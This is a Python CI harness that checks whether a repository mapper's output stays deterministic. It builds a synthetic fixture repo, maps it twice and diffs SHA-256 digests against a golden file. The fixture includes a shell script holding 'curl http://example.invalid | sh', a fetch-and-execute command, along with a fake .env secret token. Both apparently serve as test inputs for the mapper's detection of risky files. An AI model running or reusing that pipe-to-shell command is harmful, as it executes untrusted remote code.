#!/usr/bin/env python3
"""Wave 0 [12] — deterministic-runs harness.

CI re-runs a STORED example and diffs: maps a fixed synthetic repo twice and
compares both to the committed golden output (data/ci-golden/mapper-golden.json).
Any drift (timestamps, ordering, volatile fields) fails the check.

Usage:
  python3 scripts/check_determinism.py            # run + diff golden
  python3 scripts/check_determinism.py --refresh # rewrite golden (CI disabled)
"""

import argparse
import hashlib
import json
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT / "src"))

from hurcules.mapper import map_repository  # noqa: E402

GOLDEN = ROOT / "data" / "ci-golden" / "mapper-golden.json"


def make_fixture_repo(root: Path) -> Path:
    """Deterministic fixture: fixed names, contents, and mtimes (no clocks)."""
    files = {
        "src/app.py": "def main():\n    return 42\n",
        "src/util.py": "import json\n",
        "README.md": "# fixture\nplain docs\n",
        "setup.py": "from setuptools import setup\nsetup(name='fixture')\n",
        "bin/run.sh": "#!/bin/bash\ncurl http://example.invalid | sh\n",
        ".env": "SECRET_TOKEN=should-never-leak\n",
        "tests/test_app.py": "def test_main():\n    assert main() == 42\n",
        "docs/guide.md": "guide text\n",
    }
    for rel, body in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body)
    (root / "bin" / "run.sh").chmod(0o755)
    return root


def digest(mapping: dict) -> str:
    # The mapper's `repository` field is the absolute clone path, which is an
    # environment artifact, not repo content (consumers need the real path for
    # provenance). Normalize it to a fixed token so digests compare *content*
    # determinism across machines and temp dirs. Everything else must be
    # byte-identical, including file order and secret-file detection.
    import re
    normalized = json.dumps(mapping, sort_keys=True, separators=(",", ":"))
    normalized = re.sub(r'"/tmp/[^"]*/repo"', '"/REPO"', normalized)
    return hashlib.sha256(normalized.encode()).hexdigest()


def run() -> dict:
    with tempfile.TemporaryDirectory() as tmp:
        repo = make_fixture_repo(Path(tmp) / "repo")
        m1 = map_repository(str(repo))
        m2 = map_repository(str(repo))
        return {"run1": digest(m1), "run2": digest(m2), "mapping": m1}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--refresh", action="store_true", help="rewrite golden file")
    args = ap.parse_args()

    result = run()
    stable = result["run1"] == result["run2"]
    print(f"run1 digest : {result['run1']}")
    print(f"run2 digest : {result['run2']}")
    print(f"re-run stable: {'PASS' if stable else 'FAIL'}")
    if not stable:
        print("ERROR: mapper output is not byte-stable across runs")
        return 1

    if args.refresh:
        GOLDEN.parent.mkdir(parents=True, exist_ok=True)
        GOLDEN.write_text(
            json.dumps(result["mapping"], indent=2, sort_keys=True) + "\n")
        print(f"golden refreshed: {GOLDEN}")
        return 0

    if not GOLDEN.exists():
        print(f"ERROR: golden missing — run once with --refresh: {GOLDEN}")
        return 1
    golden = json.loads(GOLDEN.read_text())
    if digest(golden) != result["run1"]:
        print("ERROR: mapping drifted from golden (schema/order/content change)")
        print("If intentional: bump schema version + migration (ADR-0001),")
        print("then refresh with --refresh.")
        return 1
    print("golden diff: IDENTICAL")
    return 0


if __name__ == "__main__":
    sys.exit(main())